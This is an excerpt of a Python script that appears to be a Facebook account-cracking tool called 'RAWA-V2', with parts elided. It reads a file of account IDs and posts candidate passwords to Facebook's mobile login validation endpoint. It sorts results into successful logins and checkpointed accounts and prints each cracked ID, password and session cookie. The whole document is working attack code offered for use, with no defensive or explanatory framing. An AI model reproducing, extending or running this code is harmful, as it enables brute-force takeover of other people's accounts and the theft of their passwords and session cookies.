...
date = '25/4/2024, 24:00:00'
if date <= kat:
    print("   toolaka ragerawa ")
    print("   bo kren @l4m_rawa")
    exit()
...
def crack_file():
    #print('\033[0;92m^^^^^^^^^^^^^^^^^^^^^')
    o = input ('\033[34;1m[+] ENTER FILE PATH :\x1b[1;96m ')
...
def setting():
    ...
    #print('\033[0;92m^^^^^^^^^^^^^^^^^^^^')
    print('[1] M.FACEBOOK ')
    print('[02] WI-FI 2G 3G 4G 5G ')
    print(f'''1.Metode X Zero"''') 
    #print('\033[0;92m^^^^^^^^^^^^^^^^^^^^^')
    hc = input('  SELECT : ')
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r{Z}{H}✮ RAWA-V2 ✮    {H}{loop}{H}/{M}{len(id)}    {H}OK${ok}    {M}CP`´{cp}    {bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
    sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=headers,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
              ...
              #  print ('\x1b[32m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
                print(f'\r{H}\n[ RAWA-OK ][OK] ID`´ : {idf}[OK] PASS :{pw}|{kuki}{N}')
